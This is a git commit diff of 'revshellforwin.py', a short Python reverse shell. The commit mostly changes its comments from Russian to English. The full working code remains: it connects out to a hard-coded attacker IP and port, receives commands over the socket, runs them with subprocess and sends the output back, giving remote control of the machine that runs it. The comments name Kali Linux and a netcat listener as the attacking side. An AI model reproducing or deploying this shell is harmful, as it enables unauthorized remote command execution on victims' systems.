f759c2b6cb025e152722ec7b29ddde48a8ebbccc
Almir <113849047+Dakumiami@users.noreply.github.com>
2024-08-31 07:26:46 -0400

    revshellforwin.py

--- revshellforwin.py
+++ revshellforwin.py
@@ -1,27 +1,21 @@
 import socket
 import subprocess
 
-# IP-адрес и порт для подключения
-HOST = '172.27.113.63'  # Замените на IP вашего Kali Linux
-PORT = 1234
+# Port and IP 
+HOST = '172.27.113.63'  # Your IP address
+PORT = 1234 #Your Port in nc
 
-# Создаем сокет и подключаемся к Kali Linux
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
-# Бесконечный цикл для получения и выполнения команд
 while True:
-    # Получаем команду от атакующей машины
     command = s.recv(1024).decode("utf-8")
     
-    # Выполняем команду и захватываем результат
     if command.lower() == "exit":
         break
     
     output = subprocess.getoutput(command)
     
-    # Отправляем результат выполнения обратно на атакующую машину
     s.send(output.encode("utf-8"))
 
-# Закрываем соединение
 s.close()
